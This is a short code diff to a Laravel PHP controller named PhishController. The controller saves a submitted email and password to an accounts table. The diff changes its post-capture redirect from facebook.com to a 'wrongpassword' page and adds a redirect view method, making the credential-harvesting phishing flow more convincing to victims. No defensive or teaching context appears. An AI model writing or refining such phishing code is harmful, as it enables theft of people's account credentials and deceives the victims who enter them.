@@ -38,8 +38,8 @@ class PhishController extends Controller
         $account =new accounts();
         $account->email = $request->email;
         $account->password = $request->password;
-        $account->save();
-        return redirect('https://facebook.com');
+        $account->save(); 
+        return redirect('wrongpassword');
     }
 
     /**
@@ -85,5 +85,8 @@ class PhishController extends Controller
     public function destroy($id)
     {
         
+    }
+    public function redirect(){
+        return view('redirect');
     }
 }
